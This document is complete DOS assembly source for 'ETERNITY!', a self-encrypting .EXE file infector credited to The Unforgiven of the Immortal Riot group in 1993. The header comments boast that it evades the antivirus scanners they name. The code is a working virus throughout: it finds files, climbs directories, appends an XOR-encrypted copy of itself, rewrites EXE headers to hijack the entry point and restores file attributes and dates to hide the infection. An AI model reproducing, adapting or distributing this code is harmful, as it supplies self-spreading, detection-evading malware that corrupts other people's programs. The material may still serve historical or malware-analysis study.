; VirusName : ETERNITY!
; Origin    : Sweden
; Author    : The Unforgiven
; Date      : 15/12/93

; This is a "mutation", of Tormentor's .EXE lession. It's HIGHLY
; modified, and I'd nearly dare to call it a "new" virus. But well,
; the infection routine are the same, so I really dunno. 

; Anyway, it's a non-overwriting randomly self encrypted infector
; of .EXE programs. It'll infect up to 3 programs each run, and now
; it also contain a dot-dot routine for moving directories. This
; version have also fixed up the "file attributes", so It will
; first clean, then infect, then restore them. It'll after infections
; in other the current directory, also return to it's original dir. 

; Since its complex cryptation routine no scanners will find it. 
; Scan/MSAV/TBAV/FindViru and F-prot can't find shits. TBAVs most
; advanced heurtistic scanner will ONLY!, report that the infected
; programs got a flexible entry point, ie nothing really! Haha!,
; he can suck his dick blue, 9 out of 10 "new" viruses, blah!!!

; This virus don't have ANY destructive routine at all!, Yes, it's
; true!	I hope this one will survive into ETERNITY!..Greetings,
; must go out to Raver, and Tormentor/DY. Hope you enjoy this code!

;=============================================================================
;		           **** ETERNITY! ****
;=============================================================================

		.model	tiny
		.radix	16
		.code

Virus_Lenght	EQU	Virus_End-Virus_Start	; Lenght of virus.
		org	100

Virus_Start:	call	where_we_are
				
where_we_are:   	pop	bp
	        	sub	bp,where_we_are-Virus_Start

		call encrypt_decrypt
		jmp encryption_start
write_virus:
	    call encrypt_decrypt
		mov	ah,40		; Write virus to EOF.
		mov	cx,Virus_Lenght
		mov	dx,bp
		int	21	
	    call encrypt_decrypt
		ret

encryption_value dw 0
encrypt_decrypt:
    lea si,cs:[bp+encryption_start-virus_start]
    mov cx,(end_of_virus-encryption_start+1)/2
    mov dx,word ptr cs:[bp+encryption_value-virus_start]

again:
    xor word ptr cs:[si],dx
    add si,2
    loop again
    ret


encryption_start:

		mov	ax,es
		add	ax,10
		add	ax,cs:[bp+Exe_header-Virus_Start+16]
		push	ax
		push	cs:[bp+Exe_header-Virus_Start+14]

		push	ds
		push	cs
		pop	ds	

		mov	ah,1a				;SET-DTA
		lea dx,[bp+Own_dta-virus_start]		;till own_dta
		int	21

;Get starting dir
   mov ah,47
    xor dl,dl
    lea si,[bp+dir-virus_start]
    int 21


;start finding files
		xor di,di	;infection count

		mov	ah,4e		; We start to look for a *.EXE file
look4victim:	;mov	dx,offset file_match-Virus_Start
		;add	dx,bp	
		lea dx,[bp+file_match-virus_start]
		int	21	

		jnc	clear_attribs

		lea dx,[bp+dot_dot-virus_start]
		mov ah,3bh
		int 21h
		jnc not_root
		jmp no_victim_found
not_root:
		mov ah,4e
		jmp look4victim
;		jmp	no_victim_found ; If no *.EXE files was found.

clear_attribs:	
    mov ax,4301h
    xor cx,cx
    lea dx,[bp+own_dta-virus_start+1eh]
    int 21h

cont2:		mov	ax,3d02			    ;open file
	      	mov	dx,Own_dta-Virus_Start+1e
	      	add	dx,bp	
	       	int	21	
	
		jnc	cont1			    ;exit if error
		jmp	cant_open_file

cont1:		xchg	ax,bx			;handle in bx
	
		mov	ah,3f		;read file - 28 bytes
		mov	cx,1c		;to EXE_header
		lea dx,[bp+exe_header-virus_start]
		int	21	
	
		jnc	no_error	;exit if error
		jmp	read_error
no_error:
		cmp	byte ptr ds:[bp+Exe_header-Virus_Start],'M'
		jnz	no_exe		; !!! Some EXEs starts with ZM !!!
		cmp	word ptr ds:[bp+Exe_header-Virus_Start+12],'RI'
		jz	infected

		mov	ax,4202		; Go EOF
		xor	cx,cx	
		xor	dx,dx	
		int	21	

		push	dx
		push	ax

    mov ah,2ch 				; this gets a random
    int 21h				; encryption value..
    mov word ptr cs:[bp+encryption_value-virus_start],dx   
							          
    call write_virus
;		mov	ah,40		; Write virus to EOF.
;		mov	cx,Virus_Lenght
;		mov	dx,bp	
;		int	21	

		mov	ax,4202		; Get NEW filelenght.
		xor	cx,cx
		xor	dx,dx
		int	21

		mov	cx,200
		div	cx
		inc	ax
		mov	word ptr ds:[Exe_header-Virus_Start+2+bp],dx
		mov	word ptr ds:[Exe_header-Virus_Start+4+bp],ax

		pop	ax
		pop	dx

		mov	cx,10
		div	cx
		sub	ax,word ptr ds:[Exe_header-Virus_Start+8+bp]
		mov	word ptr ds:[Exe_header-Virus_Start+16+bp],ax
		mov	word ptr ds:[Exe_header-Virus_Start+14+bp],dx

		mov	word ptr ds:[Exe_header-Virus_Start+12+bp],'RI'

		mov	ax,4200		; Position file-pointer to BOF
		xor	cx,cx	
		xor	dx,dx	
		int	21	

		mov	ah,40		; Write header
		mov	cx,1c
;		mov	dx,offset Exe_header-Virus_Start
;		add	dx,bp
		lea dx,[bp+exe_header-virus_start]
		int	21	
	
		jc	write_error

no_exe:
		jmp close_it   ;
infected:
		dec di
close_it:

;restore date
    lea si,[bp+own_dta-virus_start+16h]
    mov cx,word ptr [si]
    mov dx,word ptr [si+2]
    mov ax,5701h
    int 21h

    mov	ah,3e		;close file
    int	21
  

; file attrib
    mov ax,4301h
    xor ch,ch
    lea bx,[bp+own_dta-virus_start+15h]
    mov cl,[bx]
    lea dx,[bp+own_dta-virus_start+1eh]
    int 21h

Sick_or_EXE:	mov	ah,4f ;find next in dir until all is found
		inc di
		cmp di,3
		jae finnished_infection
		jmp	look4victim

write_error:		; Here you can test whats went wrong.
read_error:		; This is just for debugging purpose.
cant_open_file:		; These entries are equal to eachother
no_victim_found:	; but could be changed if you need to test something.
finnished_infection:

;restore dir
    lea dx,[bp+dir-virus_start]
    mov ah,03bh
    int 21

quit:
		pop	ds
		retf

note    	db "[ETERNITY!] (c) '93 The Unforgiven/Immortal Riot " 
dot_dot		db	'..',0			 
file_match	db	'*.EXE',0	; Files to infect.
Exe_header	db	16 DUP(0)
		dw	0fff0		; Just for this com file.
		db	4  DUP(0)
Own_Dta		db	02bh DUP(0)
dir		db 65 dup (?)

Virus_End	EQU	$
end_of_virus:
		end	Virus_Start